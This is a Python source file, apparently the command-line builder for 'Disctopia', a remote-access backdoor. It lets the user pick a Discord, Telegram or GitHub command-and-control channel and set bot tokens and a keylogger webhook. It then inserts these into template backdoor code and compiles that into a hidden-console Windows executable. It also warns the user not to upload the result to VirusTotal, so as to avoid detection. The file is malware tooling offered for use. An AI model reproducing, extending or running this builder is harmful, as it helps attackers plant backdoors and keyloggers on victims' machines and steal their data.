# -*- coding: utf-8 -*-

import json
import subprocess
import os
import argparse
import distro
from prettytable import PrettyTable
from sys import platform as OS
import requests
import time
import sys

def clear_screen():
    if OS == "linux" or OS == "linux2":
        os.system("clear")

clear_screen()

print('''
▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
 ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2 (Ultimate Fix)
 ░                   ░                                                 

Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis \n\nRun 'help use' to get started!''')

settings_list = ["None", "None", "None", "None", "None"]

def createTable(settings_list):
    table = PrettyTable(["Setting", "Value"])
    table.add_row(["Backdoor Name", settings_list[0]])

    if payload == "discord":
        table.add_row(["Guild ID", settings_list[1]])
        table.add_row(["Bot Token", settings_list[2]])
        table.add_row(["Channel ID", settings_list[3]])
        table.add_row(["Keylogger Webhook", settings_list[4]])
    elif payload == "telegram":
        table.add_row(["User ID", settings_list[1]])
        table.add_row(["Bot Token", settings_list[2]])
    elif payload == "github":
        table.add_row(["Github Token", settings_list[1]])
        table.add_row(["Github Repo", settings_list[2]])
    else:
        print("[!] Please select a payload!\n")
    return table


payload = ""
try:
    while True:
        
        command = input(f"[+] {payload} > ")
        command_list = command.split()

        if command_list == []:
            continue

        if command_list[0] == "exit":
            print("\n[+] Exiting!")
            exit()

        elif command_list[0] == "use":
            if len(command_list) == 1:
                print("[!] Please specify a payload!")
            else:
                if command_list[1] == "discord":
                    print("[+] Using Discord C2")
                    payload = "discord"
                    table = createTable(settings_list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                elif command_list[1] == "telegram":
                    print("[+] Using Telegram C2")
                    payload = "telegram"
                    table = createTable(settings_list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                elif command_list[1] == "github":
                    print("[+] Using Github C2")
                    payload = "github"
                    table = createTable(settings_list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                else:
                    print("[!] Invalid payload!")

        elif command_list[0] == "set":
            if len(command_list) < 3:
                print("[!] Please specify a setting!\n")
            else:
                if command_list[1] == "name":
                    settings_list[0] = command_list[2]

                elif command_list[1] == "guild-id":
                    settings_list[1] = command_list[2]

                elif command_list[1] == "bot-token":
                    settings_list[2] = command_list[2]

                elif command_list[1] == "channel-id":
                    settings_list[3] = command_list[2]

                elif command_list[1] == "user-id":
                    settings_list[1] = command_list[2]

                elif command_list[1] == "github-token":
                    settings_list[1] = command_list[2]

                elif command_list[1] == "github-repo":
                    settings_list[2] = command_list[2]

                elif command_list[1] == "webhook":
                    settings_list[4] = command_list[2]
                else:
                    print("[!] Invalid setting!\n")

        elif command_list[0] == "config":
            if payload == "":
                print("[!] Please select a payload!\n")
            else:
                table = createTable(settings_list)
                print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                print("Run 'help set' for more information\n")

        elif command_list[0] == "clear":
            clear_screen()

        elif command_list[0] == "help":
            if len(command_list) == 1:
                print('''\n
        Help Menu:

        "help <command>" Displays more help for a specific command 

        "use <payload>" Selects a payload to use

        "set <setting> <value>" Sets a value to a valid setting

        "config" Shows the settings and their values

        "build" Packages the backdoor into an EXE file

        "update" Gets the latest version of Disctopia

        "exit" Terminates the builder
                    \n''')
            else:
                if command_list[1] == "use":
                    print('''\n
        Help Menu:

        "use <payload>" Selects a payload to use

        Payloads:

        "discord" - A Discord based C2
        "telegram" - A telegram based C2
        "github" - A github based C2
                        ''')
                elif command_list[1] == "set":
                    if payload == "":
                        print("[!] Please select a payload!\n")
                    else:
                        if payload == "discord":
                            print('''\n
        Help Menu:

        "set <setting> <value>" Sets a value to a valid setting

        Settings:

        "name" - The name of the backdoor
        "guild-id" - The ID of the Discord server
        "bot-token" - The token of the Discord bot
        "channel-id" - The ID of the Discord channel
        "webhook" - The webhook for the keylogger
                            ''')
                        elif payload == "telegram":
                            print('''\n
        Help Menu:

        "set <setting> <value>" Sets a value to a valid setting

        Settings:

        "name" - The name of the backdoor
        "bot-token" - The token of the Telegram bot
        "user-id" - The ID of the Telegram user

        IMPORTANT: This can only be used with one agent online at a time!
                            ''')

                        elif payload == "github":
                            print('''\n
        Help Menu:

        "set <setting> <value>" Sets a value to a valid setting

        Settings:

        "name" - The name of the backdoor
        "github-token" - The token of the Github bot
        "github-repo" - The name of the Github repo
                            ''')
                elif command_list[1] == "build" or command_list[1] == "update" or command_list[1] == "exit" or command_list[1] == "config" or command_list[1] == "clear":
                    print("[!] There is nothing more to show!\n")
                else:
                    print("[!] Invalid command!\n")

        elif command_list[0] == "build":
            if payload == "":
                print("[!] Please select a payload first!")
                continue
            if settings_list[0] == "None":
                print("[!] Please set a name for the backdoor!")
                continue

            print("[?] Are you sure you want to build the backdoor? (y/n)")
            choice = input()
            if choice.lower() == "y":
                print("[+] Building backdoor...")
                try:
                    if payload == "discord":
                        f = open("code/discord/main.py", 'r')
                        file_content = f.read()
                        f.close()
                        newfile = file_content.replace("{GUILD}", str(settings_list[1]))
                        newfile = newfile.replace("{TOKEN}", str(settings_list[2]))
                        newfile = newfile.replace("{CHANNEL}", str(settings_list[3]))
                        newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings_list[4]))

                    elif payload == "telegram":
                        f = open("code/telegram/main.py", 'r')
                        file_content = f.read()
                        f.close()
                        newfile = file_content.replace("{BOT_TOKEN}", str(settings_list[2]))
                        newfile = newfile.replace("{USER_ID}", str(settings_list[1]))

                    elif payload == "github":
                        f = open("code/github/main.py", 'r')
                        file_content = f.read()
                        f.close()
                        newfile = file_content.replace("{TOKEN}", str(settings_list[1]))
                        newfile = newfile.replace("{REPO}", str(settings_list[2]))
                    
                    temp_py = settings_list[0]+".py"
                    f = open(temp_py, 'w')
                    f.write(newfile)
                    f.close()

                    # Verified path to pyinstaller in Wine
                    wine_prefix = os.environ.get('WINEPREFIX', os.path.expanduser('~/.wine'))
                    path_to_pyinstaller = os.path.join(wine_prefix, 'drive_c/Python38/Scripts/pyinstaller.exe')
                    
                    if not os.path.exists(path_to_pyinstaller):
                        print(f"[!] PyInstaller not found at {path_to_pyinstaller}")
                        print("[!] Please run setup.sh first!")
                        continue

                    compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", temp_py]

                    print(f"[+] Running: {' '.join(compile_command)}")
                    subprocess.call(compile_command)
                    
                    try:
                        if os.path.exists(temp_py): os.remove(temp_py)
                        if os.path.exists(settings_list[0]+".spec"): os.remove(settings_list[0]+".spec")
                    except Exception as e:
                        print(f"[!] Error cleaning up: {e}")
                    
                    print('\n[+] The Backdoor can be found inside the "dist" directory')
                    print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
                    exit()
                except Exception as e:
                    print(f"[!] Build failed: {e}")

        elif command_list[0] == "update":
            print("[!] Update feature disabled. Please pull from GitHub.")

        else:
            print("[!] Invalid command!\n")

except KeyboardInterrupt:
    print("\n\n[+] Exiting")
